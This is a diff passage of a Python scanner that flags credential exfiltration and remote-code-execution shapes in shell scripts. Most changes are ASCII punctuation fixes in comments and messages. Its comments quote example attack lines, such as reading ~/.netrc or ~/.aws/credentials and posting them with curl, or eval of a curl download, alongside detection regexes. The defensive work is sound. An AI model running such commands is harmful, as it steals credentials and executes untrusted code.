+# `while read`, `select`, tmpfiles, `$(for ...)` capture, and a helper function defined
 # above the loop and called after it (X's taint is positional, not call-graph aware).
 # Any file whose `do`/`done` structure does not balance (a stray `done)` case label, an
-# unmatched `do`) is skipped ENTIRELY — fails closed to PASS, never a guess.
+# unmatched `do`) is skipped ENTIRELY - fails closed to PASS, never a guess.
 #
 # Vocabulary alignment (design §2.5): `_SH_CRED_READ_PATH_RE` (defined next to
 # `_SH_CRED_ASSIGN_RE` above) is the literal hop rule's own vocabulary, now including
@@ -15871,7 +15871,7 @@ def _sh_staged_exec(masked: str) -> list[tuple[int, str]]:
 # other app name in that alternative produces an indistinguishable, benign own-app
 # config-backup shape (`for f in ~/.config/myapp/*.json; do D="$D$(cat "$f")"; done;
 # curl --data "$D" https://own/backup`), and the destination is not an input to this
-# scanner — so no rule can convict on that signal without convicting the benign
+# scanner - so no rule can convict on that signal without convicting the benign
 # backup too. Both stay PASS under this design.
 #
 # B-982: this alignment must NEVER be extended to the K8s ServiceAccount token path
@@ -15879,16 +15879,16 @@ def _sh_staged_exec(masked: str) -> list[tuple[int, str]]:
 # coupling-guard comment above `_SH_CRED_READ_PATH_SRC`/`_SH_CRED_ASSIGN_RE` and
 # tests/test_b982_hop_vocab_incluster_coupling.py.
 _SH_LOOP_CONTINUATION_RE = re.compile(r"(?<!\\)((?:\\\\)*)\\\n")
-# A heredoc body is not code that runs as a `for` loop in THIS shell — it is either
+# A heredoc body is not code that runs as a `for` loop in THIS shell - it is either
 # inert data, or (if later fed to a shell) a CHILD shell's code, same reasoning as
-# `bash -c '…'` below. Blanking it here, on the un-masked text, closes the branch's
+# `bash -c '...'` below. Blanking it here, on the un-masked text, closes the branch's
 # heredoc residual (a loop header written only inside a heredoc body must never seed).
 _SH_LOOP_HEREDOC_RE = re.compile(r"<<(-?)[ \t]*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\2")
 
 
 def _sh_loop_join_continuations(text: str) -> str:
     """Same-length join of `\\`-newline continuations (2 spaces for the 2 characters
-    removed), so every offset — and so every LINE NUMBER against the original text —
+    removed), so every offset - and so every LINE NUMBER against the original text -
     computed against the joined result is still valid against the pre-join text."""
     return _SH_LOOP_CONTINUATION_RE.sub(lambda m: m.group(1) + "  ", text)
 
@@ -15915,12 +15915,12 @@ def _sh_loop_blank_heredocs(text: str) -> str:
 
 
 def _sh_loop_code_mask(text: str) -> str:
-    """Blank literal text inside `'…'`/`"…"` (never code inside a nested `$(…)` or
+    """Blank literal text inside `'...'`/`"..."` (never code inside a nested `$(...)` or
     backtick substitution) and inline `#` comments, same length. Used ONLY to locate
-    loop/bind/do-done STRUCTURE below — values and references are always read from the
+    loop/bind/do-done STRUCTURE below - values and references are always read from the
     un-masked `text`, never from this result. A `for` keyword sitting inside a quoted
-    string (`bash -c "for f in …"`) is blanked here along with the rest of that string's
-    text, so it is structurally invisible to the loop-header search — this is what
+    string (`bash -c "for f in ..."`) is blanked here along with the rest of that string's
+    text, so it is structurally invisible to the loop-header search - this is what
     keeps a header written only inside string text (a child shell's own code) from
     seeding, with no special-cased lookbehind needed."""
     out = list(text)
@@ -16014,14 +16014,14 @@ _SH_LOOP_BIND_RE = re.compile(
 )
 _SH_LOOP_IDENT_RE = re.compile(r"[A-Za-z_][A-Za-z0-9_]{0,127}")
 # A reader substitution inside an assignment's VALUE: `$(cat "$V")`, `` `cat "$V"` ``,
-# `$(< "$V")` — command-position `[path/]cat|head|tail|less`, the literal
+# `$(< "$V")` - command-position `[path/]cat|head|tail|less`, the literal
 # `_SH_CRED_ASSIGN_RE`'s own reader vocabulary (cat|less|head|tail|<).
 _SH_LOOP_SUBST_READ_RE = re.compile(
     r"(?:\$\(|`)[ \t]*(?:sudo[ \t]+)?(?:(?:[\w./-]*/)?(?:cat|head|tail|less)\b|<)"
     r"(?P<args>[^)`|;\n]{0,2048})"
 )
 # The PIPE role's own reader: `cat|head|tail "$V"` streamed to STDOUT (no redirect), at
-# command position — deliberately narrower than `_SH_LOOP_SUBST_READ_RE` (no `less`, no
+# command position - deliberately narrower than `_SH_LOOP_SUBST_READ_RE` (no `less`, no
 # bare `<`, neither of which streams to stdout the same way).
 _SH_LOOP_STDOUT_READ_RE = re.compile(
     _SH_LOOP_CMD_POS + r"(?:sudo[ \t]+)?(?:[\w./-]*/)?(?:cat|head|tail)\b(?P<args>[^\n;&|)]{0,2048})"
@@ -16105,13 +16105,13 @@ def _sh_loop_bind_content_start(m) -> int:
 def _sh_loop_blank_word_subs(seg: str) -> str:
     """Blank every balanced ``$(...)``/backtick command substitution in a `for`-loop
     word-list segment, same length. A plain whitespace `.split()` cannot tell a
-    substitution's own internal whitespace from a real word boundary — `$(ls
+    substitution's own internal whitespace from a real word boundary - `$(ls
     ~/.ssh/id_*)` splits into two tokens, and the second, `~/.ssh/id_*)`, is not itself
     prefixed with `$(` or a backtick, so a per-token "skip if it contains `$(`" check
     (as a naive read of the design's word-skip rule) misses it and leaks a credential-
     shaped fragment into the word list. Blanking the whole substitution here first, so
     it contributes no tokens at all, is what keeps a `$(...)`-built word list at PASS
-    (documented FN — the words are unknown until the substitution actually runs)."""
+    (documented FN - the words are unknown until the substitution actually runs)."""
     out = list(seg)
     i, n = 0, len(seg)
     while i < n:
@@ -16155,13 +16155,13 @@ _SH_CASE_ARM_LABEL_GAP_RE = re.compile(r"[ \t\n]*\(?(?:[ \t\n]*[^\s()|]+[ \t\n]*
 def _sh_loop_case_done_is_arm_label(kw: str, case_stack: list, dm) -> bool:
     """True iff `dm` (a `_SH_LOOP_DO_DONE_RE` match with `group("kw") == "done"`) is
     really the pattern LABEL of the innermost open case arm on `case_stack` (a list of
-    arm-start offsets — see `_sh_loop_regions`), rather than a genuine loop-closing
+    arm-start offsets - see `_sh_loop_regions`), rather than a genuine loop-closing
     keyword: the text from that arm's own start up to `dm`'s own start must be nothing
     but case-arm-pattern syntax (`_SH_CASE_ARM_LABEL_GAP_RE`, matched exactly, no
-    leftover), AND `dm` itself must be followed (skipping whitespace) by `)` — a real
+    leftover), AND `dm` itself must be followed (skipping whitespace) by `)` - a real
     case arm pattern is always terminated by one. `_SH_BRANCH_KW_RE`/`_sh_case_find_in`
     referenced here are defined later in this module (the B-935/B-984 branch-tree
-    section below) — a safe forward reference: both are resolved at CALL time, and
+    section below) - a safe forward reference: both are resolved at CALL time, and
     every call into this function happens well after the module has finished loading."""
     if not case_stack:
         return False
@@ -16175,16 +16175,16 @@ def _sh_loop_case_done_is_arm_label(kw: str, case_stack: list, dm) -> bool:
 
 
 def _sh_loop_regions(kw: str, text: str) -> list:
-    """Every `for V in <words>; do … done` loop whose word list holds at least one
+    """Every `for V in <words>; do ... done` loop whose word list holds at least one
     credential-shaped word, as `(var, file_words, read_words, body_start, cut_end,
     body_end, head_start, head_end)`. `file_words`/`read_words` are the loop words
     matching, respectively, `_SH_CRED_FILE_RE` (the DIRECT/PIPE roles' vocabulary) and
-    `_SH_CRED_READ_PATH_RE` (the HOP role's vocabulary — the literal `_SH_CRED_ASSIGN_RE`
+    `_SH_CRED_READ_PATH_RE` (the HOP role's vocabulary - the literal `_SH_CRED_ASSIGN_RE`
     reader vocabulary). `cut_end` is `body_end` unless V is rebound inside its own body
     (`_SH_LOOP_BIND_RE` matching V), in which case it is that rebinding's offset: text
     at/after a rebinding is no longer V's loop-seeded value. `head_start`/`head_end`
-    (B-936) bound the word-list segment itself — from right after `in` to the `;`/`\\n`
-    that ends it — so a caller can blank a same-line header's OWN credential-shaped
+    (B-936) bound the word-list segment itself - from right after `in` to the `;`/`\\n`
+    that ends it - so a caller can blank a same-line header's OWN credential-shaped
     text out of a literal single-line scan (see `_sh_loop_cred_exfil_lines`'s
     `header_blanked`) without touching this function's fail-closed do/done pairing.
     **Fails closed**: any GENUINE `do`/`done` imbalance anywhere in the file (an
@@ -16193,24 +16193,24 @@ def _sh_loop_regions(kw: str, text: str) -> list:
 
     CASE/ESAC-AWARE (B-957, fixed; was a known limitation through 4.3.0, not fixed by
     B-894): a `done` token that is really the PATTERN LABEL of a `case`/`esac` arm
-    (`case "$X" in ...; done) ...;; esac` — "done" used as an everyday status/state
+    (`case "$X" in ...; done) ...;; esac` - "done" used as an everyday status/state
     word, a common non-adversarial shell idiom) is structurally never a loop closer,
     and previously still matched `_SH_LOOP_DO_DONE_RE`'s bare lexical shape, unbalancing
     this function's file-wide stack and silencing every loop-based SHELL_CRED_EXFIL
-    finding in the WHOLE file — not just near that block. Fixed by tracking case/esac
+    finding in the WHOLE file - not just near that block. Fixed by tracking case/esac
     nesting and each open arm's own start offset (right after `case ... in`, or right
     after the arm's own `;;`) alongside the do/done stack, via `_sh_loop_case_done_is_arm_label`
-    below: a `done` is recognized as an arm's own pattern label — and excluded from the
-    do/done stack entirely, neither pushed nor popped — only when the text between that
+    below: a `done` is recognized as an arm's own pattern label - and excluded from the
+    do/done stack entirely, neither pushed nor popped - only when the text between that
     arm's start and the `done` token is ITSELF nothing but case-arm-pattern syntax (an
     optional leading `(`, zero or more `|`-separated pattern alternatives, whitespace)
     and `done` is itself followed (skipping whitespace) by `)`. A genuine loop's `do`/
-    `done` sitting in an arm's own BODY — after that arm's pattern-closing `)` — never
+    `done` sitting in an arm's own BODY - after that arm's pattern-closing `)` - never
     matches this gap (the class disallows `)`), so it still pairs on the do/done stack
     exactly as before; likewise a bare subshell wrapping a loop (`(for f in a; do ...;
     done)`) outside any case block never touches `case_stack` at all. See
     `test_adv_case_label_done_paren_now_recovered` (the narrower shape, the label sits
-    right next to the loop under test — pinned since B-894 as a fail-closed degrade,
+    right next to the loop under test - pinned since B-894 as a fail-closed degrade,
     now recovered too) and `test_adv_unrelated_case_done_label_elsewhere_now_recovered`
     (the broader, unrelated-code-elsewhere shape B-957 was actually filed for) in
     `tests/test_b894_shell_loop_cred_taint.py`, plus
@@ -16287,12 +16287,12 @@ def _sh_loop_regions(kw: str, text: str) -> list:
 def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
     """B-894: 1-indexed lines where a `for`-loop-bound credential should make
     SHELL_CRED_EXFIL fire, ON TOP OF (never in place of) the existing literal checks in
-    `analyze_shell`. Returns `(direct_or_pipe_lines, hop_lines, header_blanked)` — the
+    `analyze_shell`. Returns `(direct_or_pipe_lines, hop_lines, header_blanked)` - the
     first two kept separate so the caller can report each with the same message its
     literal twin uses. Three roles, each exactly the corresponding literal rule applied
     to the loop unrolled onto its words (see the design note above this section):
 
-      DIRECT — a `file_words` reference inside V's own body, on an outbound line,
+      DIRECT - a `file_words` reference inside V's own body, on an outbound line,
         substituted in and re-checked with the UNCHANGED `_SH_CRED_FILE_RE`, then
         (B-988) run through `_sh_line_incluster_exemption` -- the SAME
         real positional-argv-parsed exemption engine B-986 built for the literal
@@ -16302,30 +16302,30 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
         https://kubernetes.default.svc/...` inside a loop body was silently granted
         the exemption -- see the B-988 note above `_sh_line_incluster_exemption`).
         Reported in `direct_or_pipe_lines`.
-      HOP — an in-body assignment `X=`/`X+=` whose value reads a `read_words`-seeded V
+      HOP - an in-body assignment `X=`/`X+=` whose value reads a `read_words`-seeded V
         (`$(cat "$V")` etc.); X then carries that taint at every later offset up to its
         next non-accumulating rebinding, checked the same nearest-prior-binding way
         `_sh_cred_assign_taint_lines` (B-935) checks the literal `_SH_CRED_ASSIGN_RE`
-        form below (no B-415 exemption — the hop vocabulary has no TLS/k8s alternative).
+        form below (no B-415 exemption - the hop vocabulary has no TLS/k8s alternative).
         Reported in `hop_lines`.
-      PIPE — the body streams a `read_words`-seeded V to stdout (`cat "$V"`, no `>`),
+      PIPE - the body streams a `read_words`-seeded V to stdout (`cat "$V"`, no `>`),
         and the matching `done` is piped into an outbound command; reported on `done`,
         in `direct_or_pipe_lines`.
 
     `header_blanked` (B-936) is `masked` with every seeded region's OWN `for V in
     <words>` word-list text (see `_sh_loop_regions`'s `head_start`/`head_end`) replaced
-    by spaces — same length, same line count, so it's a drop-in substitute for `masked`
+    by spaces - same length, same line count, so it's a drop-in substitute for `masked`
     in any literal single-line scan. A one-line loop (`for c in ~/.config/app/client.pem;
-    do curl --cert "$c" https://…; done`) puts V's word on the SAME physical line as the
+    do curl --cert "$c" https://...; done`) puts V's word on the SAME physical line as the
     outbound sink, so both `analyze_shell`'s naive per-line `_SH_CRED_FILE_RE` scan AND
     this function's OWN `raw = masked[a:b]` line reconstruction below (used to build
     `sub` for the DIRECT role) would otherwise see the header's un-substituted word
-    ALONGSIDE the correctly-substituted one on the exact same slice — the header word is
+    ALONGSIDE the correctly-substituted one on the exact same slice - the header word is
     never in TLS-flag position, so `_sh_line_incluster_exemption` sees a second,
     non-exempt match and convicts a line the loop-unrolled substitution alone would
     correctly exempt. Blanking the header first makes the loop-unrolling substitution the
     SOLE source of truth for a loop-bound word reaching an outbound line, on one-line and
-    multi-line loops alike — never broader than, and never narrower than, what the
+    multi-line loops alike - never broader than, and never narrower than, what the
     per-word substitution itself would convict.
 
     Returns `(set(), set(), masked)` (never raises) on any input, including one with no
@@ -16365,12 +16365,12 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
         return bool(_SH_OUTBOUND_RE.search(line) or _sh_bare_nc_invocation(line))
 
     # 1. DIRECT: a file_words-seeded V referenced on an outbound line inside its own
-    #    body — substitute each candidate word in for every in-region $V on that raw
+    #    body - substitute each candidate word in for every in-region $V on that raw
     #    line, then run the UNCHANGED literal rule on the result.
     #
     # B-894 fix round 1 (review finding 1, BLOCKER): `ref.finditer(text, bs,
     # cut)` yields one match PER REFERENCE to V, and every match on the same physical
-    # line needs the identical `line_span`/`outbound`/`spans` work — the substitution
+    # line needs the identical `line_span`/`outbound`/`spans` work - the substitution
     # result depends only on the line, never on which particular reference started the
     # lookup. The original code redid that whole-line work once per reference instead
     # of once per line, so a line with N references to V cost O(N * line_length): a
@@ -16378,13 +16378,13 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
     # loop variable drove `check_installed_skills`'s 15 s per-check budget
     # (`checks/__init__.py`'s `run_all`) into `ScanBudgetExceeded`, collapsing the
     # WHOLE audit's shell-analysis findings (SHELL_CRED_EXFIL, F-050, F-056, F-064) to
-    # UNKNOWN — not just for the offending file. `ref.finditer` yields matches in
+    # UNKNOWN - not just for the offending file. `ref.finditer` yields matches in
     # increasing offset order, so once a line's span `[a, b)` is known via `line_span`,
     # every later match with `start() < b` is on that SAME line and is skipped by a
-    # plain integer comparison (`last_b`) — never another `rfind`/`find` scan, and never
+    # plain integer comparison (`last_b`) - never another `rfind`/`find` scan, and never
     # another `outbound`/`spans` recomputation. That keeps `line_span`, `outbound` and
     # the candidate-word substitution to exactly one run per physical line touched by V,
-    # regardless of how many times V is referenced on it — the same one-scan-per-line
+    # regardless of how many times V is referenced on it - the same one-scan-per-line
     # cost as every other check in `analyze_shell`, including the pre-existing literal
     # SHELL_CRED_EXFIL checks. This changes the DIRECT role's own complexity only: the
     # substituted text and verdict for a given line are unchanged, because the
@@ -16393,8 +16393,8 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
     #
     # B-894 fix round 2 (review finding 1, BLOCKER, introduced by round 1's own
     # dedup): round 1 collapsed the per-REFERENCE cost to per-LINE, but every
-    # surviving line still tried EVERY word in `sorted(file_words)` — one
-    # `_sh_cred_match_is_incluster_auth_only` call and substitution per word — and
+    # surviving line still tried EVERY word in `sorted(file_words)` - one
+    # `_sh_cred_match_is_incluster_auth_only` call and substitution per word - and
     # only stopped early via `break` once a word both matched `_SH_CRED_FILE_RE`
     # and was NOT exempt. Placing every `file_words` entry right after curl's own
     # --cert/--cacert TLS flag makes the exemption excuse every single
@@ -16404,10 +16404,10 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
     # (96 KB) already exceeded the 15 s per-check scan budget. The fix: the
     # TLS/in-cluster exemption verdict for a given (line, reference-span) depends
     # only on the raw line's own flag/prefix structure around the substituted
-    # span — never on WHICH word fills it, since every `file_words` entry already
+    # span - never on WHICH word fills it, since every `file_words` entry already
     # matches `_SH_CRED_FILE_RE` on its own and is inserted intact. So the
     # substitution and its exemption check are computed ONCE per line using a
-    # single representative word, not once per word — restoring O(1)
+    # single representative word, not once per word - restoring O(1)
     # exemption-checks per line regardless of how large `file_words` is, the same
     # amortization round 1 already applied to same-line reference count, just
     # applied to the other multiplication axis (distinct file_words × distinct
@@ -16722,16 +16722,16 @@ def _sh_loop_cred_exfil_lines(source: str, masked: str) -> tuple:
 # above. `cred_vars` (in `analyze_shell` below) used to be a flat, FILE-GLOBAL set of
 # variable names built once from every `_SH_CRED_ASSIGN_RE` match in the file, and the
 # sink check then matched any `$NAME` reference on any outbound line ANYWHERE in the
-# file — with no regard to whether THAT SPECIFIC reference still held the
+# file - with no regard to whether THAT SPECIFIC reference still held the
 # credential-read value at that point. Two real shapes this let through:
-#   1. `C=$(cat ~/.netrc); C=$(date); curl -d "$C" https://x.example` — C is REBOUND
+#   1. `C=$(cat ~/.netrc); C=$(date); curl -d "$C" https://x.example` - C is REBOUND
 #      to a harmless value before the sink runs, but the flat set still convicted.
-#   2. `curl -d "$X" https://x.example/t; X=$(cat ~/.netrc)` — the credential read
+#   2. `curl -d "$X" https://x.example/t; X=$(cat ~/.netrc)` - the credential read
 #      happens AFTER the sink, not before; X is unset/unrelated when curl runs.
 # Fix: resolve each `$NAME` reference to its own nearest-PRIOR binding, using exactly
 # the SAME state-machine/bisect mechanism the HOP role above already uses
 # (`_SH_LOOP_BIND_RE` for every rebind event file-wide, `bisect_right` at reference
-# time) — not a second, independent dataflow engine. Unlike HOP, this is not scoped to
+# time) - not a second, independent dataflow engine. Unlike HOP, this is not scoped to
 # any loop region: every `_SH_LOOP_BIND_RE` match in the whole file is a rebind event
 # for its own name, and taint is seeded directly from `_SH_CRED_ASSIGN_RE` (the
 # UNCHANGED literal vocabulary), not from a loop-variable hop.
@@ -17188,8 +17188,8 @@ def _sh_cred_replay(
 
 
 def _sh_cred_assign_taint_lines(masked: str) -> set:
-    """1-indexed outbound lines where a `$NAME` reference positionally resolves —
-    by nearest PRIOR reachable binding, never by file-global set membership — to a
+    """1-indexed outbound lines where a `$NAME` reference positionally resolves -
+    by nearest PRIOR reachable binding, never by file-global set membership - to a
     still-live `_SH_CRED_ASSIGN_RE` credential-read value. `+=` accumulation keeps
     whatever taint state the name already carried (mirrors the HOP role's own `keep`
     semantics: an append can only add to what is already there, never launder it
@@ -17205,7 +17205,7 @@ def _sh_cred_assign_taint_lines(masked: str) -> set:
     Safety net: a `_SH_CRED_ASSIGN_RE` match that `_SH_LOOP_BIND_RE` itself does not
     also recognize as a bind (e.g. an assignment sitting somewhere `_SH_LOOP_CMD_POS`'s
     command-position lookbehind does not cover) is still seeded as its own tainting
-    event at its own offset — this positional replacement must convict everything the
+    event at its own offset - this positional replacement must convict everything the
     old flat set did, only scoped correctly to the right reference, never LESS.
 
     Every `if`/`elif` branch's own span starts at the KEYWORD's own end, not its
@@ -17229,7 +17229,7 @@ def _sh_cred_assign_taint_lines(masked: str) -> set:
     defined above the loop and called after it"): resolution is POSITIONAL, not
     call-graph aware. A function whose body references NAME, textually written BEFORE
     the credential-read assignment that (at runtime) only lands in NAME once the
-    function is later CALLED, is invisible here — the reference's own offset precedes
+    function is later CALLED, is invisible here - the reference's own offset precedes
     the binding's, so the nearest-prior-binding lookup finds nothing. This is a plain
     forward reference through a delayed call, the same shape B-894 already carries as
     a documented FN rather than inventing a call-graph model this scanner does not
@@ -17265,7 +17265,7 @@ def _sh_cred_assign_taint_lines(masked: str) -> set:
     # heredoc-blanked form computed above), not bare `masked` -- an outbound word
     # (curl/wget/nc) on a backslash-continued command's FIRST physical line must
     # still cover its continuation lines, where the `$NAME` reference typically sits
-    # (`curl -sS -X POST \` / `  --data "$K" \` / `  https://…`). Building spans from
+    # (`curl -sS -X POST \` / `  --data "$K" \` / `  https://...`). Building spans from
     # `masked` instead would only capture the first physical line's own narrow span,
     # missing every reference on a continuation line -- exactly the same offset
     # alignment `text` already gives every other consumer in this file (same-length
@@ -17307,20 +17307,20 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
     """Conservative regex pass over a bundled .sh/.bash/.zsh file (F-050). No shell AST;
     stdlib regex only; never raises, never executes. Flags high-confidence shapes:
 
-      SHELL_CRED_EXFIL (crit) — a credential file is read and its contents reach an
+      SHELL_CRED_EXFIL (crit) - a credential file is read and its contents reach an
         outbound command (curl/wget/nc//dev/tcp): read a secret -> send it out.
-      SHELL_PIPE_INTERP (crit) — a remote payload is downloaded and piped straight into a
+      SHELL_PIPE_INTERP (crit) - a remote payload is downloaded and piped straight into a
         non-shell interpreter (curl URL | python/node/perl/...): remote code execution.
-      SHELL_DECODE_EXEC (crit) — an encoded blob is decoded (base64/xxd/openssl -d) and
+      SHELL_DECODE_EXEC (crit) - an encoded blob is decoded (base64/xxd/openssl -d) and
         piped straight into a shell/interpreter: obfuscated remote code execution.
-      SHELL_EVAL_REMOTE (crit) — eval/source of a remote download
-        (eval "$(curl … http…)" / source <(wget … http…)): remote code execution.
-      SHELL_ENV_EXFIL (crit) — a credential-shaped env var ($…TOKEN/$…SECRET/…) is sent
+      SHELL_EVAL_REMOTE (crit) - eval/source of a remote download
+        (eval "$(curl ... http...)" / source <(wget ... http...)): remote code execution.
+      SHELL_ENV_EXFIL (crit) - a credential-shaped env var ($...TOKEN/$...SECRET/...) is sent
         over a RAW socket (nc//dev/tcp): credential exfiltration.
 
     Whole-line comments are ignored so documentation examples stay clean. The naive
-    forms — any $VAR piped to curl (authed-API scripts), or any bare $() command
-    substitution — stay deliberately out of scope: SHELL_EVAL_REMOTE and SHELL_ENV_EXFIL
+    forms - any $VAR piped to curl (authed-API scripts), or any bare $() command
+    substitution - stay deliberately out of scope: SHELL_EVAL_REMOTE and SHELL_ENV_EXFIL
     are the tight, zero-FP slices of those (remote-fed eval; raw-socket-only, cred-named)."""
     out: list[ASTFinding] = []
     seen: set = set()
@@ -17339,7 +17339,7 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
             "crit",
             ln,
             "downloads a remote payload and pipes it into an interpreter "
-            "(curl/wget ... | python/node/perl/...) — remote code execution",
+            "(curl/wget ... | python/node/perl/...) \u2014 remote code execution",
         )
 
     for m in _SH_DECODE_EXEC_RE.finditer(masked):
@@ -17349,7 +17349,7 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
             "crit",
             ln,
             "decodes an encoded blob and pipes it into a shell/interpreter "
-            "(base64/xxd/openssl -d | sh) — obfuscated remote code execution",
+            "(base64/xxd/openssl -d | sh) \u2014 obfuscated remote code execution",
         )
 
     for ln, path in _sh_staged_exec(masked):
@@ -17357,7 +17357,7 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
             "SHELL_STAGED_EXEC",
             "crit",
             ln,
-            f"downloads a remote payload to {path} and then executes that same path — "
+            f"downloads a remote payload to {path} and then executes that same path \u2014 "
             "staged remote code execution (the payload never appears in this file)",
         )
 
@@ -17367,14 +17367,14 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
             "SHELL_EVAL_REMOTE",
             "crit",
             ln,
-            "eval/source of a remote download (eval \"$(curl ... http...)\") — "
+            "eval/source of a remote download (eval \"$(curl ... http...)\") \u2014 "
             "remote code execution",
         )
 
     for i, raw in enumerate(masked.splitlines(), 1):
         # B-430: the raw-socket check is `_SH_RAW_SOCKET_RE` (ncat/netcat/`/dev/tcp/`,
         # unambiguous) OR'd with `_sh_bare_nc_invocation` (the token classifier for the
-        # ambiguous bare `nc` — see its docstring above).
+        # ambiguous bare `nc` - see its docstring above).
         if (
             _SH_RAW_SOCKET_RE.search(raw) or _sh_bare_nc_invocation(raw)
         ) and _SH_CRED_ENV_RE.search(raw):
@@ -17383,32 +17383,32 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
                 "crit",
                 i,
                 "a credential-shaped environment variable is sent over a raw socket "
-                "(nc//dev/tcp) — credential exfiltration",
+                "(nc//dev/tcp) \u2014 credential exfiltration",
             )
 
     # B-935: `cred_var_lines` is the POSITIONAL replacement for the old flat,
-    # file-global `cred_vars` NAME set — see `_sh_cred_assign_taint_lines`'s own
+    # file-global `cred_vars` NAME set - see `_sh_cred_assign_taint_lines`'s own
     # docstring above for why a name-membership check over-and-under-convicted (a
     # rebound name stayed tainted forever; a name read only AFTER the sink line was
     # tainted retroactively). It reports LINES, not names, because "is this reference
     # live" is a per-reference question, not a per-name one.
     cred_var_lines = _sh_cred_assign_taint_lines(masked)
-    # B-894: loop-unrolled counterparts of the two checks below — see the design note
+    # B-894: loop-unrolled counterparts of the two checks below - see the design note
     # above `_sh_mask_comments`. `loop_direct_lines` is the DIRECT/PIPE roles (the
     # `_SH_CRED_FILE_RE` sink-line vocabulary, same message/exemption as the block right
     # below); `loop_hop_lines` is the HOP role (joins `cred_var_lines`, same message, no
-    # exemption — matches how `cred_var_lines` itself gets none). `header_blanked` (B-936) is
-    # `masked` with every seeded loop's OWN `for V in <words>` word-list text blanked —
+    # exemption - matches how `cred_var_lines` itself gets none). `header_blanked` (B-936) is
+    # `masked` with every seeded loop's OWN `for V in <words>` word-list text blanked -
     # same length, same line count, a documented drop-in substitute for `masked` in any
-    # literal single-line scan (see `_sh_loop_cred_exfil_lines`'s own docstring) — so a
+    # literal single-line scan (see `_sh_loop_cred_exfil_lines`'s own docstring) - so a
     # one-line loop's header (`for c in ~/.config/app/client.pem; do curl --cert "$c"
-    # https://…; done`) never lets its own un-substituted word feed the naive literal
+    # https://...; done`) never lets its own un-substituted word feed the naive literal
     # scan below; only the loop-unrolled substitution (`loop_direct_lines`/
     # `loop_hop_lines`, which already applies B-415's TLS/in-cluster exemption to the
     # substituted word) may convict a loop-bound reference.
     #
-    # B-912: the sink check below must ALSO see a LOGICAL line — a backslash-`\`-newline
-    # continued command joined back into one line — not a bare PHYSICAL line. An
+    # B-912: the sink check below must ALSO see a LOGICAL line - a backslash-`\`-newline
+    # continued command joined back into one line - not a bare PHYSICAL line. An
     # ordinary multi-line invocation:
     #
     #     S=$(cat ~/.aws/credentials)
@@ -17419,17 +17419,17 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
     # puts the outbound word (`curl`) and the credential reference (`"$S"`) on
     # DIFFERENT physical lines, so neither the literal-path branch (`_SH_CRED_FILE_RE`)
     # nor the `cred_var_lines` variable-reference branch below could ever see both
-    # halves at once — a real miss (FN), not an evasion, since this is ordinary shell
+    # halves at once - a real miss (FN), not an evasion, since this is ordinary shell
     # formatting.
     # `_sh_loop_join_continuations` is applied to `header_blanked` (not bare `masked`)
     # so BOTH fixes compose: the text is header-blanked AND continuation-joined before
     # this scan ever runs. Since `header_blanked` is line-structure-identical to
-    # `masked` (same length, same newline positions — never blanks a real `\n`, per its
+    # `masked` (same length, same newline positions - never blanks a real `\n`, per its
     # own docstring), `masked.count("\n", 0, offset)` against an offset taken from
     # either text returns the identical physical line number either way. Splitting the
     # joined text on real newlines then yields exactly the LOGICAL lines (a
     # continuation no longer contributes a `\n` of its own), each reported at its FIRST
-    # physical line (`i` below) — never a continuation line, so a finding always points
+    # physical line (`i` below) - never a continuation line, so a finding always points
     # at the command's own first line. Known limitation inherited from
     # `_sh_loop_join_continuations` (already accepted for its B-936 use): the join is a
     # blind text substitution with no quote-state awareness, so a `\`-newline that is a
@@ -17437,13 +17437,13 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
     # it as a continuation) is still joined here. This can only ever make a logical
     # line LONGER (never split a real one), which cannot manufacture a new
     # outbound/cred-file/cred-var match that was not already textually present
-    # somewhere in the surrounding lines — no C-135 FP shape was found from it (see the
+    # somewhere in the surrounding lines - no C-135 FP shape was found from it (see the
     # corpus/fleet compare in the commit).
     #
     # Both the literal-path branch AND the B-415/B-986 in-cluster-auth exemption
     # (`_sh_line_incluster_exemption`) run against this SAME joined line, so a
     # destination or Authorization header sitting on a continuation line is visible
-    # to the exemption exactly as it is to the sink check itself — giving the two
+    # to the exemption exactly as it is to the sink check itself - giving the two
     # branches an inconsistent view of the same command is the exact shape B-911's
     # fall-through comment already guards against.
     loop_direct_lines, loop_hop_lines, header_blanked = _sh_loop_cred_exfil_lines(source, masked)
@@ -17453,7 +17453,7 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
         i = masked.count("\n", 0, pos) + 1
         line_end = masked.count("\n", 0, pos + len(raw)) + 1
         pos += len(raw) + 1
-        # B-430: same OR pattern as above — see _sh_bare_nc_invocation's docstring.
+        # B-430: same OR pattern as above - see _sh_bare_nc_invocation's docstring.
         if not (_SH_OUTBOUND_RE.search(raw) or _sh_bare_nc_invocation(raw)):
             continue
         if _SH_CRED_FILE_RE.search(raw):
@@ -17472,7 +17472,7 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
                     "crit",
                     i,
                     "reads a credential file and sends it to an outbound command "
-                    "(curl/wget/nc) — credential exfiltration",
+                    "(curl/wget/nc) \u2014 credential exfiltration",
                 )
                 continue
             # B-911: the B-415 exemption above is judged ONLY against the literal
@@ -17484,7 +17484,7 @@ def analyze_shell(source: str, filename: str = "<skill>") -> list[ASTFinding]:
             # `cred_var_lines` hit in the same command.
         # `loop_direct_lines`/`loop_hop_lines`/`cred_var_lines` all hold PHYSICAL line
         # numbers (the B-894/B-935 engines' own per-physical-line reporting, unchanged
-        # by this fix — see the B-912 note above). A hit anywhere in the physical span
+        # by this fix - see the B-912 note above). A hit anywhere in the physical span
         # this logical line covers belongs to this same command, so it is reported
